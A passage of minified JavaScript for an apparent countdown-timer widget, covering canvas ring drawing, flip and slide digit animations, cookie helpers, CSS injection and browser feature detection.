          this.drawArc(t, e, i, r, b, g, s, o, l, u, c),
          this.drawArc(t, e, i, p, y, a, m, d, h, u, c)
        );
    }),
    (t.prototype.circleTick = function () {
      var t,
        e,
        i,
        a,
        n,
        r,
        s = parseInt(this.params.design.params.width),
        o = parseInt(this.params.design.params.radius) + Math.round(s / 2),
        l = this.params.design.params["line-color"],
        p = this.params.design.params["background-color"],
        m = "direct" === this.params.design.params.direction,
        d = [];
      for (r in this.timerElements)
        this.timerElements[r].view &&
        this.timerElements[r].updated &&
        (t = document.getElementById("timer-canvas-" + this.id + "-" + r))
          .getContext
          ? ((a = t.getContext("2d")).clearRect(0, 0, t.width, t.height),
            (e = Math.round(t.width / 2)),
            (i = Math.round(t.height / 2)),
            (n = this.timerElements[r].value / this.timerElements[r].max),
            m && (n = 1 - n),
            d.push(
              this.drawRing(
                a,
                e,
                i,
                n,
                0,
                o,
                s,
                p,
                null,
                o,
                s,
                l,
                null,
                "round",
                m
              )
            ))
          : d.push(void 0);
      return d;
    }),
    (t.prototype.plateTick = function () {
      var a,
        n,
        r,
        s,
        t,
        o,
        l,
        p,
        m,
        d = function (t, e) {
          var i, a, n;
          if (m.animationSupport() && m.params.design.params.animation)
            return (
              (n = m.params.design.params.effect),
              (i = document.getElementById(
                "timer-number-" + n + t + "-" + m.id + "-" + e
              )),
              m.removeClass(i, "timer-" + n + "-animate"),
              (a = m),
              requestAnimationFrame(function () {
                return i.offsetLeft, a.addClass(i, "timer-" + n + "-animate");
              })
            );
        },
        e = [];
      for (o in (m = this).timerElements)
        this.timerElements[o].updated
          ? ((t = this.timerElements[o].value),
            (p = [t % 10, Math.floor((t / 10) % 10), Math.floor(t / 100)]),
            (n = 0),
            e.push(
              function () {
                for (var t = [], e = 0, i = p.length; e < i; e++) {
                  switch (((l = p[e]), this.params.design.params.effect)) {
                    case "flipchart":
                      null !=
                        (s = document.getElementById(
                          "timer-number-flipchart" + n + "-" + this.id + "-" + o
                        )) &&
                        null != s.childNodes &&
                        1 === s.childNodes.length &&
                        (a = s.childNodes[0].childNodes) &&
                        null != a &&
                        5 === a.length &&
                        a[0].innerHTML !== l &&
                        ((null != (r = parseInt(a[1].innerHTML)) &&
                          0 <= r &&
                          r <= 9) ||
                          (r = ""),
                        this.params.design.params.animation || (r = l),
                        (r === l && this.params.design.params.animation) ||
                          ((a[0].innerHTML = r),
                          (a[1].innerHTML = l),
                          (a[2].innerHTML = l),
                          (a[3].innerHTML = r),
                          d(n, o)));
                      break;
                    case "slide":
                      null !=
                        (s = document.getElementById(
                          "timer-number-slide" + n + "-" + this.id + "-" + o
                        )) &&
                        null != s.childNodes &&
                        3 === s.childNodes.length &&
                        (a = s.childNodes) &&
                        a[1].innerHTML !== l &&
                        ((null != (r = parseInt(a[1].innerHTML)) &&
                          0 <= r &&
                          r <= 9) ||
                          (r = ""),
                        this.params.design.params.animation || (r = l),
                        (r === l && this.params.design.params.animation) ||
                          ((a[0].innerHTML = r),
                          (a[1].innerHTML = l),
                          d(n, o)));
                  }
                  t.push(n++);
                }
                return t;
              }.call(this)
            ))
          : e.push(void 0);
      return e;
    }),
    (t.prototype.getCookie = function (t) {
      return (t = document.cookie.match(
        new RegExp(
          "(?:^|; )" +
            t.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") +
            "=([^;]*)"
        )
      ))
        ? decodeURIComponent(t[1])
        : null;
    }),
    (t.prototype.setCookie = function (t, e, i) {
      var a, n, r, s, o, l;
      for (
        "number" == typeof (n = (i = i || {}).expires) &&
          n &&
          ((a = new Date()).setTime(a.getTime() + 1e3 * n),
          (n = i.expires = a)),
          n && n.toUTCString && (i.expires = n.toUTCString()),
          s = t + "=" + (e = encodeURIComponent(e)),
          o = 0,
          l = i.length;
        o < l;
        o++
      )
        (s += "; " + (r = i[o])), !0 !== (r = i[r]) && (s += "=" + r);
      return (document.cookie = s);
    }),
    (t.prototype.cloneObject = function (t) {
      var e, i, a;
      if (!t || "object" != typeof t) return t;
      for (i in ((e = "function" == typeof t.pop ? [] : {}), t))
        l.call(t, i) &&
          ((a = t[i]),
          (e[i] = a && "object" == typeof a ? this.cloneObject(a) : a));
      return e;
    }),
    (r = function (t, e, i, a) {
      return (
        null == a && (a = !1),
        null != t.addEventListener
          ? t.addEventListener(e, i, a)
          : null != t.attachEvent
          ? t.attachEvent("on" + e, i)
          : (t["on" + e] = function () {
              return i();
            })
      );
    }),
    (t.prototype.addCustomCss = function (t) {
      var e, i;
      return (
        (a = "timer-" + this.id + "-style"),
        null != (i = document.getElementById(a)) &&
          (i.styleSheet ? (i.styleSheet.cssText = "") : (i.innerHTML = ""),
          i.parentNode.removeChild(i)),
        (e = document.getElementsByTagName("head")[0]),
        (i = document.createElement("style")).setAttribute("type", "text/css"),
        (i.id = a),
        i.styleSheet
          ? (i.styleSheet.cssText = t)
          : i.appendChild(document.createTextNode(t)),
        e.appendChild(i)
      );
    }),
    (t.prototype.addCssLink = function (t) {
      var e, i, a, n, r, s, o;
      if (
        null != t &&
        (((i = document.createElement("div")).innerHTML = t),
        null != (a = document.getElementsByTagName("head")) &&
          0 < a.length &&
          i.childNodes.length)
      ) {
        for (
          e = i.childNodes[0], s = (o = a[(r = 0)].childNodes).length;
          r < s;
          r++
        )
          if (((n = o[r]), this.isEqualsNodes(n, e))) return;
        return a[0].appendChild(e);
      }
    }),
    (t.prototype.isEqualsNodes = function (t, e) {
      var i, a, n, r, s, o, l, p, m;
      if (null != t && null != e)
        if ("#text" === t.nodeName || "#text" === e.nodeName) {
          if (
            "#text" === t.nodeName &&
            "#text" === e.nodeName &&
            t.data === e.data
          )
            return !0;
        } else if (
          null != t.tagName &&
          null != e.tagName &&
          t.tagName.toLowerCase() === e.tagName.toLowerCase()
        ) {
          for (a = 0, r = (o = t.attributes).length; a < r; a++) {
            if (((l = !(i = o[a])), 0 <= g.call(e.attributes, l))) return !1;
            if (i.value !== e.getAttribute(i.nodeName)) return !1;
          }
          for (n = 0, s = (p = e.attributes).length; n < s; n++) {
            if (((m = !(i = p[n])), 0 <= g.call(t.attributes, m))) return !1;
            if (i.value !== t.getAttribute(i.nodeName)) return !1;
          }
          return !0;
        }
      return !1;
    }),
    (t.prototype.addClass = function (t, e) {
      if (!this.hasClass(t, e))
        return (t.className = "" === t.className ? e : t.className + " " + e);
    }),
    (t.prototype.removeClass = function (t, e) {
      e = new RegExp("(?:^|\\s)" + e + "(?!\\S)", "g");
      return (t.className = t.className.replace(e, ""));
    }),
    (t.prototype.hasClass = function (t, e) {
      return null != t.className && -1 !== t.className.indexOf(e);
    }),
    (t.prototype.animationSupport = function () {
      var t, e, i, a, n, r, s, o;
      if (null != window.animationSupport) return window.animationSupport;
      if (
        ((s = !1),
        (r = ["Webkit", "Moz", "O", "ms", "Khtml"]),
        void 0 !== document.body.style.animationName && (s = !0),
        !s)
      )
        for (n = 0; n < r.length; ) {
          if (void 0 !== document.body.style[r[n] + "AnimationName"]) {
            s = !0;
            break;
          }
          n++;
        }
      if (s) {
        for (
          i = document.createElement("div"),
            e = ["-webkit-", "-moz-", "-ms-", ""],
            t = "",
            n = 0;
          n < e.length;

        )
          (t +=
            "@" +
            e[n] +
            "keyframes csspseudoanimations { from { font-size: 10px; } }"),
            n++;
        for (
          t += '#timer-tester:before { content:" "; font-size:5px;', n = 0;
          n < e.length;

        )
          (t += e[n] + "animation:csspseudoanimations 1ms infinite;"),
            (t += e[n] + "animation-fill-mode: forwards;"),
            n++;
        (o = '<style id="s-timer-tester">' + (t += "}") + "</style>"),
          (i.id = "timer-tester"),
          (i.innerHTML += o),
          null == (o = document.body) &&
            ((o = document.createElement("body")).fake = !0),
          o.appendChild(i),
          null != o.fake &&
            ((o.style.background = ""),
            (o.style.overflow = "hidden"),
            (a = docElement.style.overflow),
            (docElement.style.overflow = "hidden"),
            docElement.appendChild(o)),
          (s =
            "10px" ===
            window
              .getComputedStyle(i, ":before")
              .getPropertyValue("font-size")),
          null != o.fake
            ? (o.parentNode.removeChild(o),
              (docElement.style.overflow = a),
              docElement.offsetHeight)
            : i.parentNode.removeChild(i);
      }
      return (window.animationSupport = s);
    }),
    (t.prototype.getIEVersion = function () {
      var t, e;
      return null !=
        (t = window.navigator.userAgent.match(/MSIE *\d+\.\w+/i)) &&
        1 < (e = t[0].split(/[ \/\.]/i)).length
        ? parseInt(e[1])
        : null;
    }),
    t);
}).call(this);
